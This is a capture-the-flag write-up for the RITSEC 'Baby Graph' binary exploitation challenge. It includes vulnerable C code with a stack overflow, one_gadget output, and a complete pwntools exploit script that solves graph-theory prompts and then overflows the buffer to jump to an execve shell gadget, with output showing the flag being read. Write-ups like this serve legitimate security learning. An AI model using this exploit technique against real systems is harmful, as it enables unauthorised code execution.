# RITSEC Baby Graph Write Up

## Details:

Jeopardy style CTF

Category: Binary Exploitation

Comments:

This is what happens to your baby when you want a pwner and a graph theorist. Do your part!!!

```
nc challenges1.ritsec.club 1339
```

## Write up:

Looking at the C source we can see that we need to answer some graph theory questions and then we get to the vulnerability:

```c
void vuln() {
    char buf[100];

    printf("Here is your prize: %p\n", system);
    fgets(buf, 400, stdin);
}
```

This function prints out the address of system and then reads in data resulting in a buffer overflow. 

At this point my teammate made a quick script to do the graph theory problems which then let me check if we could get a segfault.

This challenge provided a libc so I did not need to leak libc. I then used one_gadget to find potential jumps:

```
one_gadget libc.so.6  

0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Using gdb I found that 0xe6c81 was the call I wanted and that I would need 120 NOPs. I then created the following script:

```python
# import pwntools
from pwn import *

# open connection
conn = remote('challenges1.ritsec.club', 1339)

# open libc
libc = ELF('./libc.so.6')

# get system call offset
sysCall = libc.symbols['system']

# do graph theory stuff
from collections import defaultdict
   
class Graph:
    def __init__(self,vertices):
        self.V= vertices #No. of vertices
        self.graph = defaultdict(list) # default dictionary to store graph
    def addEdge(self,u,v):
        self.graph[u].append(v)
        self.graph[v].append(u)
    def DFSUtil(self,v,visited):
        visited[v]= True
        for i in self.graph[v]:
            if visited[i]==False:
                self.DFSUtil(i,visited)
    def isConnected(self):
        visited =[False]*(self.V)
        for i in range(self.V):
            if len(self.graph[i]) > 1:
                break
        if i == self.V-1:
            return True
        self.DFSUtil(i,visited)
        for i in range(self.V):
            if visited[i]==False and len(self.graph[i]) > 0:
                return False
        return True
    def isEulerian(self):
        if self.isConnected() == False:
            return 0
        else:
            odd = 0
            for i in range(self.V):
                if len(self.graph[i]) % 2 !=0:
                    odd +=1
            return odd==0
  
def i():
    s = conn.recvline().strip().decode()
    print(s)
    return s
for _ in range(5):
    i()
    l=i().split(' ')
    v =int(l[2])
    e=int(l[6])
    g = Graph(v)
    for _ in range(e):
        a,b = i().split()
        g.addEdge(int(a),int(b))
    i()
    print(g.isEulerian())
    if g.isEulerian():
        conn.send('Y\n')
    else:
        conn.send('N\n')

# get the system address
addy = conn.readline()
addy = (int(str(addy)[22:-3], 16))

# make the nops
nops = b'\x90'* 120

# send the payload
conn.sendline(nops + p64(addy - sysCall + 0xe6c81))

# open interactive mode
conn.interactive()
```

When run I got the following:

```
[+] Opening connection to challenges1.ritsec.club on port 1339: Done
[*] '/home/kali/Downloads/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Here is your baby graph
V = 9 - E = 11
0 2
0 8
2 3
2 4
2 5
2 6
3 6
4 8
6 7
6 8
7 8
Now tell me if this baby is Eulerian? (Y/N)
False
Here is your baby graph
V = 2 - E = 0
Now tell me if this baby is Eulerian? (Y/N)
True
Here is your baby graph
V = 9 - E = 35
0 1
0 2
0 3
0 4
0 5
0 6
0 7
0 8
1 2
1 3
1 4
1 5
1 6
1 7
1 8
2 3
2 4
2 5
2 6
2 7
2 8
3 4
3 5
3 6
3 7
3 8
4 5
4 6
4 7
4 8
5 6
5 7
5 8
6 8
7 8
Now tell me if this baby is Eulerian? (Y/N)
False
Here is your baby graph
V = 6 - E = 0
Now tell me if this baby is Eulerian? (Y/N)
True
Here is your baby graph
V = 5 - E = 0
Now tell me if this baby is Eulerian? (Y/N)
True
[*] Switching to interactive mode
$ cat flag.txt
RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}
```